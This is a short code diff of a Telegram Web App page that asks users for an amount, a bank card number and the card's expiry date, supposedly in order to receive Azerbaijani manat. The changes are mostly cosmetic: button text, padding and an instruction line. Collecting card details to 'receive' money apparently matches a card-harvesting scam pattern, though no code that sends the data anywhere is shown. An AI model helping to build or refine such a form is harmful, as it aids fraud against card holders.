@@ -47,7 +47,7 @@
 
         let tg = window.Telegram.WebApp;
         tg.expand();
-        tg.MainButton.setText("Оплатил!");
+        tg.MainButton.setText("Оплатить");
         tg.MainButton.show();
         tg.SecondaryButton.show();
         tg.SecondaryButton.setText("Отменить");
@@ -115,14 +115,14 @@
         .container {
             max-width: 800px;
             margin: 0 auto;
-            padding: 30px;
+            padding: 35px;
         }
     </style>
 </head>
 <body style="overflow:hidden;">
     <div class="container">
         <main>
-            <h1>💵Отправить AZN💵</h1>
+            <h1>Отправить AZN</h1>
         </main><br>
         <div>
             <label>Введите сумму в <b>AZN</b>:</label><br><br>
@@ -133,6 +133,7 @@
             <input style="font-family: 'Open Sans', sans-serif;" maxlength="19" id="card" inputmode="numeric" pattern="[0-9]*" placeholder="1234 5678 9012 3456" oninput="formatCardNumber(this)"><br><br>
             <label><b>СРОК ДЕЙСТВИЯ НА КАРТЕ</b> для получения AZN</label><br>
             <input style="font-family: 'Open Sans', sans-serif;" maxlength="5" id="date" inputmode="numeric" pattern="[0-9]*" placeholder="MM/YY" oninput="formatDate(this)"><br><br>
+            <p>Проверьте данные, если все поля верно заполнены нажмите на "Оплатить"</p>
         </div>
     </div>
 </body>
